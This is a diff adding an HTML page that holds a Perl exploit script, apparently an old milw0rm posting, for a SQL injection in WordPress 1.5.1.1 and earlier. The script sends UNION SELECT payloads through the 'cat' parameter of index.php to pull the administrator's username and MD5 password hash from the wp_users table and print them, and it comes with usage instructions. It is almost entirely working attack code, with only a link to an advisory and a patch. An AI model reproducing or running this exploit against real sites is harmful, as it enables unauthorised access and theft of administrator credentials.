@@ -1,0 +1,40 @@
+<html>
+<head>
+<title>WordPress <= 1.5.1.1 SQL Injection Exploit</title>
+</head>
+<pre>
+#!/usr/bin/perl -w
+#
+# SQL Injection Exploit for WordPress &lt;= 1.5.1.1
+# This exploit shows the username of the administrator of the blog and his
+# password crypted in MD5, you must only choose the correct version of the target
+# Related advisory: http://www.gentoo.org/security/en/glsa/glsa-200506-04.xml
+# Patch: download the last version at http://wordpress.org/download/
+# Coded by Alberto Trivero
+
+use LWP::Simple;
+
+print &quot;\n\t====================================\n&quot;;
+print &quot;\t= Exploit for WordPress &lt;= 1.5.1.1 =\n&quot;;
+print &quot;\t=        by Alberto Trivero        =\n&quot;;
+print &quot;\t====================================\n\n&quot;;
+
+if(!$ARGV[0] or !($ARGV[0]=~m/http/) or !($ARGV[1]==1 or $ARGV[1]==2)) {
+   print &quot;Usage:\nperl $0 [full_target_path] [target_version: 1 OR 2]\nVersion 1: WordPress &lt;= 1.5\nVersion 2: WordPress 1.5.1 - 1.5.1.1\n\n&quot;;
+   print &quot;Examples:\nperl $0 http://www.example.com/wordpress/ 2\n&quot;;
+   exit(0);
+}
+
+$page=get($ARGV[0].&quot;index.php?cat=%2527%20UNION%20SELECT%20CONCAT(CHAR(58),user_pass,CHAR(58),user_login,CHAR(58))%20FROM%20wp_users/*&quot;) || die &quot;[-] Unable to retrieve: $!&quot; if($ARGV[1]==1);
+$page=get($ARGV[0].&quot;index.php?cat=999%20UNION%20SELECT%20null,CONCAT(CHAR(58),user_pass,CHAR(58),user_login,CHAR(58)),null,null,null%20FROM%20wp_users/*&quot;) || die &quot;[-] Unable to retrieve: $!&quot; if($ARGV[1]==2);
+print &quot;[+] Connected to: $ARGV[0]\n&quot;;
+$page=~m/:([a-f0-9]{32}):(.*?):/;
+print &quot;[+] Username of administrator is: $2\n&quot; if($2);
+print &quot;[+] MD5 hash of password is: $1\n&quot; if($1);
+print &quot;[-] Unable to retrieve username\n&quot; if(!$2);
+print &quot;[-] Unable to retrieve hash of password\n&quot; if(!$1);
+
+# milw0rm.com [2005-06-22]
+</pre>
+</html>
+
